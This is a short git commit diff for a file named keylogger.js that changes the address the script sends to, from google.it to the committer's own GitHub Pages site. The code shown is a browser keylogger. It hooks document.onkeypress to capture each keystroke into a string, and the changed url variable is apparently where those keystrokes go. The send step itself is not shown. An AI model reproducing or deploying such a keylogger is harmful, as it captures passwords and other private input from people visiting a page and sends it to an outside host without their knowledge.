a7e098f5a2577006e73a52936a04190cd04e8a0d
dave111111111 <116874785+dave111111111@users.noreply.github.com>
2022-10-28 11:23:01 +0200

    Update keylogger.js

--- keylogger.js
+++ keylogger.js
@@ -1,5 +1,5 @@
 var keys='';
- var url = 'https://www.google.it/';
+ var url = 'https://dave111111111.github.io/dave111111111-website/';
  document.onkeypress = function(e) {
      get = window.event?event:e;
      key = get.keyCode?get.keyCode:get.charCode;
